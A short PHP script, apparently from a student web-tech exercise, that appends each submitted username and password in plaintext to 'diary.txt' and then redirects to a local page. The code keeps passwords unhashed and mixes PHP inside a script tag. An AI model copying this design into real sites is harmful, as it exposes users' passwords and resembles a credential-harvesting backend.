<script type="text/javascript">
<?php
 //if (isset($_POST['submit'])
 //{



$File = "diary.txt";
$file_open = fopen($File, "a") or die("can't open file");
$start="\r\n".'user:';
$end='___password:';
$username = $start.$_POST['name'].$end;
fwrite($file_open, $username);
echo ":";
$password = $_POST['pwd'];
echo "\n";
fwrite($file_open, $password);





fclose($file_open);
//}
?>
//<script>
      window.location.href = 'localhost/mca_webtech/main.html';

//header('Location: diary.html');
//exit;
</script>
